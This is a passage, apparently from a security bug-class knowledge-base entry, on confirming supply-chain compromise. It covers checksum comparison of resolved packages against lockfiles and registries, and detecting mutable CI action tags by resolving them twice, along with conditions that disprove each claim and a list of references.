Do the arithmetic. Take the artifact your build resolved - the file in the module cache, the unpacked directory, the fetched tarball - hash it, and compare against two independent references: the checksum your lockfile pins and the checksum the registry or checksum database serves for that version. Three outcomes, and only the third is a finding. Identical everywhere: the bytes you ran match what was published, so nothing was substituted on this path. Identical to the lockfile but the lockfile itself was regenerated after the compromise, or GONOSUMDB/GOPRIVATE or GOSUMDB=off disabled verification for that module: this is an integrity-verification gap, report it as such, and the evidence is the configuration, not a hash mismatch. Different: the bytes differ from both references, which is substitution, and the reportable artefacts are the two digests, the resolved version, the proxy or source URL the bytes came from, and the timestamp - because a proxy that can serve different content for the same version is precisely the stated property that makes this detectable. Confirm with a second fetch through a different proxy or direct from version control before reporting, to rule out a corrupted local cache.

*Disproof:* The claim is false if the recomputed digest matches the lockfile and the registry, since then the installed bytes are the published bytes and no substitution occurred on that path. It is also false if the version you flagged is simply newer than the one pinned - a version difference is an update decision, not evidence of tampering, and the digest is what settles it. And it is false as a compromise claim when the mismatch is confined to files the build never executes - a README, a test fixture, or a metadata file excluded from the install path - because the running code is unchanged; re-hash only the files actually loaded before reporting, and state which ones you excluded.

**An unpinned CI action or workflow reference is a demonstrable supply-chain exposure only when two resolutions of the same tag name yield different commit SHAs, proving the ref is mutable and the build's meaning changes without any change to your repository.**

The demonstration is a resolution diff, not a style preference. Take the tag the workflow references, resolve it twice through git ls-remote with a gap of hours or days, and compare the SHAs. Different SHAs for the same tag is the finding: the tag was moved, so the code your pipeline runs is not fixed by your repository, and the person who moved it needs only write access to the upstream repository. Where you cannot wait for a natural move, the honest framing is that this is a mutable-reference exposure with a stated mechanism rather than an observed change, and the report should say which of the two it is. Complete the picture by resolving the SHA each tag pointed at when it was first published through the marketplace or the repository's release history, so the reader can see how far the current ref has drifted from the reviewed one. Then state the blast radius precisely: which workflows in which repositories reference the tag, and whether each consumer repository would execute whatever the tag now resolves to on its next run. A tag pinned to a full-length commit SHA is immutable by comparison, which is why the recommendation is specific rather than stylistic.

*Disproof:* The claim is false when both resolutions return the same SHA, which means the ref was stable across the observation window - the exposure is real but the mutation was not observed, and the report must be worded as a mutable reference rather than as a demonstrated tag move. It is also false if the consumer already pins a full-length commit SHA and merely carries a comment naming a friendly tag, since the executed code is fixed. And it is false as an active compromise if the resolved commit's content matches the reviewed version and its signature verifies against the maintainer's key, since a moved ref that re-points at identical bytes changes nothing; verify the commit before reporting a supply-chain event rather than assuming one from the ref syntax.

## Impact

Not yet researched.

## Related Bug Classes

Not yet researched.

## References

- **cheatsheetseries.owasp.org** (writeup)
  - <https://cheatsheetseries.owasp.org/cheatsheets/CI_CD_Security_Cheat_Sheet.html>
  - <https://cheatsheetseries.owasp.org/cheatsheets/Deserialization_Cheat_Sheet.html>
- **cwe.mitre.org** (taxonomy)
  - <https://cwe.mitre.org/data/definitions/1104.html>
  - <https://cwe.mitre.org/data/definitions/494.html>
  - <https://cwe.mitre.org/data/definitions/506.html>
  - <https://cwe.mitre.org/data/definitions/798.html>
  - <https://cwe.mitre.org/data/definitions/829.html>
- **docs.github.com** (writeup)
  - <https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions>
- **docs.npmjs.com** (writeup)
  - <https://docs.npmjs.com/cli/v11/using-npm/scripts>
- **elastic.co** (research)
  - <https://www.elastic.co/security-labs/blog/axios-supply-chain-compromise-detections>
- **flatt.tech** (writeup)
  - <https://flatt.tech/research/posts/poisoning-claude-code-one-github-issue-to-break-the-supply-chain/>
- **go.dev** (writeup)
  - <https://go.dev/ref/mod>
- **labs.watchtowr.com** (research)
  - <https://labs.watchtowr.com/8-million-requests-later-we-made-the-solarwinds-supply-chain-attack-look-amateur/>
- **securelist.com** (research)
  - <https://securelist.com/tr/payload-ransomware-via-group-policy/121335/>
  - <https://securelist.com/vulnerabilities-and-exploits-in-q2-2026/121091/>
- **stepsecurity.io** (writeup)
  - <https://www.stepsecurity.io/blog/introducing-deny-list-egress-policies-for-harden-runner>
- **unit42.paloaltonetworks.com** (research)
  - <https://unit42.paloaltonetworks.com/detecting-exposed-aws-iam-credentials/>
- **welivesecurity.com** (report)
  - <https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q4-2025-q1-2026>
  - <https://www.welivesecurity.com/en/eset-research/eset-apt-activity-report-q4-2025-q1-2026/>

Every item above is gated on >= 2 distinct publisher hosts (`wks/quality.py`, rule R1). Publisher diversity, not citation count, is what makes these corroborated.
